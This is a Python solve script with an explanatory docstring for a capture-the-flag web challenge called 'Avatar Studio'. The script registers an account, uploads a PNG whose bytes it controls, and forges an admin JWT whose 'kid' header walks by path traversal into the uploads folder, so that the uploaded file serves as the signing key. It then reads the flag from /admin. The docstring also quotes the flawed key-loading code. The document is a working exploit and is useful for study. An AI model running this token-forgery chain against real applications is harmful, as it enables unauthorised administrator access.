#!/usr/bin/env python3
"""Avatar Studio -- THJCC CTF 2026 Summer (web, 100 pts).

Full chain, standard library only:

  1. GET /robots.txt  -> discloses /panel-legacy ; probing finds an exposed .git
     directory (the "strange thing"). Dumping it yields app.py.
  2. app.py verifies the JWT session cookie by loading the HMAC key from a file
     *named by the token's own `kid` header*:

         def load_key(kid):
             if "\\x00" in kid: abort(400)
             if kid.startswith("/"): abort(400)      # blocks absolute paths...
             path = os.path.join(KEY_DIR, kid)       # ...but NOT ".."
             return open(path, "rb").read()

     So `kid` is a path traversal relative to keys/. There is no signature-key
     secret to guess -- we just point `kid` at a file whose bytes we know.
  3. POST /upload stores our avatar verbatim at uploads/<hex>.<ext> (bytes are
     preserved). That is our known-content key file.
  4. Forge a token with kid="../uploads/<hex>.png" and role="admin", signing
     with the uploaded file's bytes. keys/ + ".." -> uploads/, key matches.
  5. GET /admin with the forged cookie -> the admin panel renders the flag.

The flag is FLAG = os.environ.get("FLAG", "THJCC{local_test_flag_not_the_real_one}").
The deployment never sets FLAG, so the *default string is the flag* -- the author's
joke: you complete the whole JWT-kid + upload forgery and the prize taunts you with
"not the real one". (The /panel-legacy "fake_leg4cy_d3bug_c0ns0le_backd00r" string
is the separate decoy for anyone who just reads the leaked token out of the source.)

    python3 solve.py [BASE_URL]
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import io
import json
import re
import sys
import urllib.request
import urllib.error
from http.cookiejar import CookieJar

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://chal.thjcc.org:31227"

# a minimal but valid 1x1 PNG -- bytes we fully control and therefore know
PNG = bytes.fromhex(
    "89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c489"
    "0000000a49444154789c6300010000050001"
    "0d0a2db40000000049454e44ae426082"
)


def b64url(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def forge(kid: str, payload: dict, key: bytes) -> str:
    header = {"alg": "HS256", "typ": "JWT", "kid": kid}
    seg = b64url(json.dumps(header, separators=(",", ":")).encode()) + "." + \
          b64url(json.dumps(payload, separators=(",", ":")).encode())
    sig = hmac.new(key, seg.encode(), hashlib.sha256).digest()
    return seg + "." + b64url(sig)


def main() -> int:
    jar = CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

    # 1) register -> receive a signed `session` JWT (role: user)
    opener.open(urllib.request.Request(
        BASE + "/register", data=b"username=pwn", method="POST"), timeout=20).read()
    print("[+] registered")

    # 2) upload our known-content avatar -> server sets avatar=<hex>.png
    boundary = "----avatarstudio"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="avatar"; filename="a.png"\r\n'
        f"Content-Type: image/png\r\n\r\n"
    ).encode() + PNG + f"\r\n--{boundary}--\r\n".encode()
    req = urllib.request.Request(BASE + "/upload", data=body, method="POST")
    req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
    opener.open(req, timeout=20).read()
    avatar = next((c.value for c in jar if c.name == "avatar"), None)
    if not avatar:
        print("[-] no avatar cookie -- upload rejected"); return 1
    print(f"[+] uploaded avatar -> uploads/{avatar}  ({len(PNG)} bytes, known)")

    # 3) forge an admin token: kid traverses keys/ -> uploads/<file>,
    #    HMAC key = the uploaded file's bytes
    kid = f"../uploads/{avatar}"
    token = forge(kid, {"username": "admin", "role": "admin"}, PNG)
    print(f"[+] forged admin JWT with kid={kid!r}")

    # 4) hit /admin with the forged session cookie
    req = urllib.request.Request(BASE + "/admin")
    req.add_header("Cookie", "session=" + token)
    try:
        html = opener.open(req, timeout=20).read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        print(f"[-] /admin returned {e.code}"); return 1

    m = re.search(r"THJCC\{[^}]*\}", html)
    if m:
        print(f"\n[+] admin panel reached. flag = {m.group(0)}")
        if "local_test" in m.group(0):
            print("    (^ that IS the flag -- the deployment never sets FLAG, so the "
                  "default string is the reward. Cheeky.)")
        return 0
    print("[-] admin reached but no flag pattern found:\n", html[:400])
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
